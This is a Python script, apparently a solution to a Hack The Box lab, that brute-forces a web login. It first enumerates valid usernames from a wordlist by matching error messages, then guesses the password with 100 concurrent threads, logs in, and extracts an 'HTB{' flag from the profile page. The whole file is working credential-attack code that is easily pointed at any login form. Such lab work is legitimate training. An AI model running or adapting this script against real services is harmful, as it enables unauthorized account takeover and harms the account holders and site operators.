#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed


def getUsernameWordlist():
    with open("username.txt", "r") as f:
        usernames = [line.strip() for line in f if line.strip()]
    return usernames


def getPasswordWordlist():
    with open("password.txt", "r") as f:
        passwords = [line.strip() for line in f if line.strip()]
    return passwords


def try_username(session, login_url, username, proxies):
    post_login = session.post(login_url, 
                            data={"username": username, "password": "KqHB2n33M2Cd"}, 
                            proxies=None, 
                            verify=False)
    error_message = "Unknown username or password"
    if error_message in post_login.text:
        return None
    return username


def try_password(session, login_url, username, password, proxies):
    post_login = session.post(login_url, 
                            data={"username": username, "password": password}, 
                            proxies=None, 
                            verify=False)
    error_message = "Invalid"
    if error_message in post_login.text:
        return None
    return password


if __name__ == "__main__":
    proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
    host = '94.237.57.1:53992'
    base_url = f'http://{host}'

    otp_url = base_url + '/2fa.php'
    login_url = base_url + '/login.php'

    session = requests.Session()
    max_threads = 100
    batch_size = 1000

    # Sort usernames in alphabetical order to try common names first
    username_list = sorted(getUsernameWordlist())
    max_attempts = len(username_list)
    for batch_start in range(0, max_attempts + 1, batch_size):
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = []
            for username in username_list[batch_start:batch_start + batch_size]:
                futures.append(executor.submit(try_username, session, login_url, username, proxies))

            for future in as_completed(futures):
                try:
                    data = future.result()
                    if data:
                        print(f"Valid username found: {data}")
                        break
                except Exception as e:
                    print(f"Error trying username: {e}")
                    exit(1)

    username = data
    pw_list = sorted(getPasswordWordlist())
    max_attempts = len(pw_list)
    password = ''
    for batch_start in range(0, max_attempts + 1, batch_size):
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = []
            for password in pw_list[batch_start:batch_start + batch_size]:
                futures.append(executor.submit(try_password, session, login_url, username, password, proxies))

            for future in as_completed(futures):
                try:
                    data = future.result()
                    if data:
                        print(f"Valid password found: {data}")
                        password = data
                        break
                except Exception as e:
                    print(f"Error trying password: {e}")
                    exit(1)

    # Final login attempt with valid credentials
    print(f"Attempting final login with username: {username} and password: {password}\n")
    login_user = session.post(login_url, 
                              data={"username": username, "password": password}, 
                              proxies=proxies, 
                              verify=False,
                              allow_redirects=False)

    # print response headers
    print("[+] Response Headers:")
    for header, value in login_user.headers.items():
        print(f"{header}: {value}")

    profile_url = base_url + '/profile.php'
    profile_page = session.get(profile_url, proxies=proxies, verify=False, allow_redirects=False)
    print("\n[+] Profile Page:")

    # Only print the body of HTB{ string
    start_index = profile_page.text.find("HTB{")
    if start_index != -1:
        end_index = profile_page.text.find("}", start_index) + 1
        if end_index != -1:
            print(profile_page.text[start_index:end_index])
        else:
            print("Closing brace not found.")
            print(profile_page.text)
    else:
        print("HTB{ not found in the profile page.")    
        print(profile_page.text)